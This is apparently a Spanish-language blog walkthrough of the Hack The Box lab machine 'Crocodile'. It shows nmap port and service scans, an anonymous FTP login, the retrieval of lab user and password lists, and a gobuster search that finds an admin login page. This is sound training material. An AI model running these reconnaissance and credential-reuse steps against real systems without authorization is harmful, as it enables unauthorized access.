---
title: Crocodile HTB walkthrough
published: true
---

# Crocodile HTB walkthrough

## Fase de reconocimiento

Comenzamos buscando puertos abiertos:

```
$sudo nmap -p- --open -sS -min-rate 5000 -n -Pn <ip>
Starting Nmap 7.80 ( https://nmap.org ) at 2023-01-30 23:07 CET

Nmap scan report for <ip>
Host is up (0.21s latency).
Not shown: 57623 closed ports, 7910 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
21/tcp open  ftp
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 24.41 seconds
```

Vemos que tenemos abiertos los puertos 21 y 80, así que continuamos buscando las versiones e información detallada:

```
$nmap -p21,80 -sCV <ip>
Starting Nmap 7.80 ( https://nmap.org ) at 2023-01-30 23:14 CET
Nmap scan report for 10.129.69.30
Host is up (0.13s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
|_-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.17.74
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Smash - Bootstrap Business Template
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.16 seconds
```

Vemos en primer lugar que se permite un inicio de sesion anónimo mediante ftp (puerto 21). En cuanto al otro servicio, http, sabemos que se trata de una aplicación web que hace uso de bootstrap.

## Tratamos de conectarnos via FTP

Como permite el inicio de sesion anónimo, podemos intentar conectarnos:

```
$ftp <ip>
Connected to 10.129.69.30.
220 (vsFTPd 3.0.3)
Name (10.129.69.30:naibu3): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

Conseguimos de esta forma entrar en el servidor.

## Buscando dentro del servidor

Con `help` podemos listar los comandos disponibles. Con `dir` listaremos información del directorio actual y con `get` podremos descargarnos archivos.

```
ftp> dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
226 Directory send OK.
ftp>
```

Vemos dos archivos sospechosos, así que los descargamos en nuestra máquina para buscar credenciales de usuario.

```
ftp> get allowed.userlist.passwd
local: allowed.userlist.passwd remote: allowed.userlist.passwd
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for allowed.userlist.passwd (62 bytes).
226 Transfer complete.
62 bytes received in 0.00 secs (284.2576 kB/s)

ftp> get allowed.userlist
local: allowed.userlist remote: allowed.userlist
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for allowed.userlist (33 bytes).
226 Transfer complete.
33 bytes received in 0.00 secs (295.6565 kB/s)

ftp> bye
221 Goodbye.
```

Listamos ahora el contenido de los archivos:

```
$cat allowed.userlist
aron
pwnmeow
egotisticalsw
admin

$cat allowed.userlist.passwd
root
Supersecretpassword1
@BaASD&9032123sADS
rKXM59ESxesUFHAd
```

Tenemos posibles credenciales de varios usuarios entre los que se encuentra el usuario administrador. Sin embargo, no sirven en el servicio ftp, ya que nos dice que es anonymous-only.

## Buscando en la aplicación web

Después de navegarla descubrimos que no nos lleva a ningún sitio. Con wappalizer tan sólo vemos información como que está programada en php. Así que trataremos de buscar posibles rutas con gobuster:

```
sudo gobuster -m dir -u http://10.129.69.30 -x php,html -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
```

Tras esperar unos minutos, vemos que se lista una ruta /login.php en la que podremos probar las credenciales. Resultando en que las credenciales funcionan para el usuario admin y ta tenemos la flag. Enhorabuena!